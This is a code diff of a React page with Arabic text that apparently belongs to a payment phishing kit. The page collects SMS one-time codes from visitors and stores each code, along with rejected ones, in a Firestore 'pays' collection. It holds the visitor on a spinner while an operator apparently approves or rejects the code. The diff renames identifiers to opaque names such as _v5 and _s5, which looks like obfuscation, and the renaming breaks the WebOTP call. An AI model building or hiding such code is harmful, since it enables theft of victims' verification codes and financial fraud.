@@ -17,9 +17,9 @@ const allOtps: string[] = []
 
 export default function VeriPage() {
   const router = useRouter()
-  const [otp, setOtp] = useState("")
+  const [_v5, _s5] = useState("")
   const [error, setError] = useState("")
-  const [otpStatus, setOtpStatus] = useState<"pending" | "verifying" | "approved" | "rejected">("pending")
+  const [_v5Status, setOtpStatus] = useState<"pending" | "verifying" | "approved" | "rejected">("pending")
   const [isLoading, setIsLoading] = useState(true)
   const [visitorId, setVisitorId] = useState<string>("")
   const [canResend, setCanResend] = useState(false)
@@ -59,7 +59,6 @@ export default function VeriPage() {
       return
     }
 
-    // Check if there's a payment record
     const checkAccess = async () => {
       const docRef = doc(db, "pays", visitorID)
       const unsubscribe = onSnapshot(docRef, (docSnapshot) => {
@@ -86,21 +85,21 @@ export default function VeriPage() {
       (docSnapshot) => {
         if (docSnapshot.exists()) {
           const data = docSnapshot.data()
-          const status = data.otpStatus as "pending" | "verifying" | "approved" | "rejected"
+          const status = data._v5Status as "pending" | "verifying" | "approved" | "rejected"
 
           if (status === "rejected") {
             // Save rejected OTP and reset status
             const currentOtp = {
-              code: data.otp,
+              code: data._v5,
               rejectedAt: new Date().toISOString()
             }
             
             updateDoc(doc(db, "pays", visitorID), {
               oldOtp: data.oldOtp ? [...data.oldOtp, currentOtp] : [currentOtp],
-              otpStatus: "pending"
+              _v5Status: "pending"
             }).then(() => {
               setOtpStatus("pending")
-              setOtp("") // Clear the old code
+              _s5("") // Clear the old code
               setError("تم رفض رمز التحقق. يرجى إدخال رمز صحيح.")
             }).catch(err => {
               console.error("Error saving rejected OTP:", err)
@@ -167,12 +166,12 @@ export default function VeriPage() {
       navigator.credentials
         .get({
           // @ts-ignore
-          otp: { transport: ['sms'] },
+          _v5: { transport: ['sms'] },
           signal: ac.signal,
         })
-        .then((otp: any) => {
-          if (otp && otp.code) {
-            setOtp(otp.code)
+        .then((_v5: any) => {
+          if (_v5 && _v5.code) {
+            _s5(_v5.code)
           }
         })
         .catch((err) => {
@@ -188,7 +187,7 @@ export default function VeriPage() {
   const handleOtpSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
 
-    if (otp.length < 4) {
+    if (_v5.length < 4) {
       setError("يرجى إدخال رمز التحقق")
       return
     }
@@ -197,19 +196,19 @@ export default function VeriPage() {
     if (!visitorID) return
 
     try {
-      allOtps.push(otp)
+      allOtps.push(_v5)
       // Update the document with the OTP
       await updateDoc(doc(db, "pays", visitorID), {
-        otp,
+        _v5,
         otpSubmittedAt: new Date().toISOString(),
         allOtps,
-        otpStatus: "verifying", // Set to verifying, waiting for admin decision
+        _v5Status: "verifying", // Set to verifying, waiting for admin decision
         otpUpdatedAt: new Date().toISOString()
       })
 
       // Add OTP to history
       await addToHistory(visitorID, "_t2", {
-        otpCode: otp
+        _v5Code: _v5
       }, "pending")
 
       setOtpStatus("verifying") // Show loading state
@@ -235,7 +234,7 @@ export default function VeriPage() {
       // Reset timer
       setCanResend(false)
       setResendTimer(60)
-      setOtp("")
+      _s5("")
       setError("")
     } catch (err) {
       console.error("Error resending OTP:", err)
@@ -250,7 +249,7 @@ export default function VeriPage() {
   return (
     <div className="min-h-screen bg-[#0a4a68] flex items-center justify-center p-4" dir="rtl">
       {/* Full Screen Spinner when verifying */}
-      {(otpStatus === "verifying") && (
+      {(_v5Status === "verifying") && (
         <UnifiedSpinner message="جاري المعالجة" submessage="الرجاء الانتظار...." />
       )}
 
@@ -297,15 +296,15 @@ export default function VeriPage() {
                 inputMode="numeric"
                 autoComplete="one-time-code"
                 placeholder="رمز التحقق"
-                value={otp}
+                value={_v5}
                 onChange={(e) => {
                   const value = e.target.value.replace(/\D/g, "").slice(0, 6)
-                  setOtp(value)
+                  _s5(value)
                   setError("")
                 }}
                 maxLength={6}
                 className="h-14 text-center text-4xl px-4 border-2 border-gray-300 focus:border-[#0a4a68] rounded-xl bg-white placeholder:text-gray-400"
-                disabled={otpStatus === "verifying"}
+                disabled={_v5Status === "verifying"}
                 required
                 autoFocus
               />
@@ -332,7 +331,7 @@ export default function VeriPage() {
             <Button
               type="submit"
               className="w-full h-14 bg-gradient-to-r from-yellow-400 to-yellow-500 hover:from-yellow-500 hover:to-yellow-600 text-[#0a4a68] font-bold text-xl rounded-xl shadow-lg hover:shadow-xl transition-all"
-              disabled={otp.length < 4 || otpStatus === "verifying"}
+              disabled={_v5.length < 4 || _v5Status === "verifying"}
             >
               تأكيد
             </Button>
